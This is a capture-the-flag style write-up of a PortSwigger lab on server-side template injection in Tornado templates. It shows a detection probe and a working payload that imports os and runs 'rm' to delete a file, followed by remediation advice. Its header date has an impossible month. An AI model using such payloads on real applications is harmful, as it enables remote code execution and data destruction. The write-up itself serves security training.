# Lab: Basic Server-Side Template Injection (Tornado Template)
- Date: 2025-20-11
- Platform: PortSwigger Academy
- Difficulty: Practitioner
- Vulnerability: Server-Side Template Injection (SSTI) in Tornado Template

## Lab Description
    This lab is vulnerable to server-side template injection due to unsafe usage of a Tornado template. The vulnerability exists in a code context where user input is improperly handled. The goal is to exploit the Tornado template injection to execute arbitrary Python code and delete the morale.txt file from Carlos's home directory.

## Key Steps
- Authentication: Logged in using credentials wiener:peter
- Vulnerability Identification: Discovered SSTI in the blog-post-author-display parameter
- Template Engine Detection: Confirmed Tornado template engine with arithmetic test
- Code Execution: Used Tornado template syntax to import and execute OS commands
- File Deletion: Successfully removed the target file using system command

## Vulnerable Endpoint
```
POST / [Application Form]
blog-post-author-display={{7*7}}&csrf=YGeZieKqo4ll6jrV3cd3thYOLFav3auq
```

## Exploitation Payloads

    # Template engine confirmation
        {{7*7}}  # Returned "49" - confirmed Tornado template

    # File deletion payload
        {% import os %}{{ os.system('rm /home/carlos/morale.txt') }}

## Attack Flow
Authentication → Parameter Discovery → Template Engine Confirmation → Code Execution → File Deletion

## Vulnerability Details
- Unsafe Template Construction: User input directly processed in Tornado template context
- Code Context Injection: Input in code execution context rather than simple display
- Lack of Input Sanitization: No validation of Tornado template syntax
- Python Code Execution: Tornado template tags allow arbitrary Python code execution

## Tornado Template Specifics
- Syntax: {{ Python expression }} and {% Python statement %}
- Import Statements: {% import module %} for module imports
- Code Execution: Direct Python code execution within template tags
- File Operations: Access to full Python standard library including os module

## Lesson Learned
- Never process user input in template code execution contexts
- Implement strict input validation for template syntax characters
- Use context-aware output encoding based on template usage
- Restrict template engine capabilities in production environments
- Tornado templates can execute arbitrary Python code if improperly handled

## Remediation
- Separate data from code in template rendering
- Implement whitelist-based input validation
- Use template context-aware escaping mechanisms
- Sandbox template execution environments
- Avoid user input in template code execution contexts

# Real-World Impact: 
```Tornado template injection vulnerabilities can lead to remote code execution, server compromise, and complete application control in Python web applications using the Tornado framework.```
